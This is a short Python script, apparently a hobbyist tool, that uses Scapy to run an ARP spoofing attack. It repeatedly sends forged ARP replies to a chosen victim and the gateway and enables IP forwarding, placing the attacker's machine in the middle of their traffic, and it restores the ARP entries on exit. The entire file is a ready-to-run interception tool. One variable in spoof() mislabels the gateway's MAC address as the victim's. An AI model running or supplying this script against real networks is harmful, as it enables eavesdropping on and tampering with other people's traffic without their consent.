from scapy.all import *
import sys
import time
import os

def enable_ip_forward():
    ipForwardFile = "/proc/sys/net/ipv4/ip_forward"
    file = open("{}".format(ipForwardFile),"w")
    file.write("1")
    file = open("{}".format(ipForwardFile),"r")
    for line in file:
        line = line.strip()
        print("IP-Forward ist auf {} gesetzt!".format(line))
    file.close()

def disable_ip_forward():
    ipForwardFile = "/proc/sys/net/ipv4/ip_forward"
    file = open("{}".format(ipForwardFile),"w")
    file.write("0")
    file = open("{}".format(ipForwardFile),"r")
    for line in file:
        line = line.strip()
        print("IP-Forward ist auf {} gesetzt!".format(line))
    file.close()

def get_mac(ip):
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=2,verbose=0)
    if ans:
        return ans[0][1].src

def spoof(victim_ip, gateway_ip):
    victim_mac = get_mac(gateway_ip)
    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, op="is-at")
    send(arp_response, verbose=0)
    attacker_mac = ARP().hwsrc
    print(f"Send to {victim_ip} : {gateway_ip} is-at {attacker_mac}")

def restore(victim_ip, gateway_ip):
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(arp_response, count=7, verbose=0)
    time.sleep(1)
    print("[+] Sent to {} : {} is-at {}".format(victim_ip, gateway_ip, gateway_mac))

if __name__ == "__main__":

    if len(sys.argv) != 3:
        print("[+] Usage : {} -Victim-IP-  -Gateway-IP- !!!" .format(sys.argv[0]))
        print("[++] For finish programm type CRTL-c [++]")
        sys.exit(0)
    """
    victim = str(sys.argv[1])
    gateway = str(sys.argv[2])
    """
    victim = "{}".format(sys.argv[1])
    gateway = "{}".format(sys.argv[2])

    enable_ip_forward()

    try:
        while True:
            spoof(victim, gateway)
            spoof(gateway, victim)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\r[*** Detect CRTL-c ! Restoring the Network ....]\n")
        restore(victim, gateway)
        restore(gateway, victim)

    disable_ip_forward()

    print("--- Programm ist beendet ---")



    





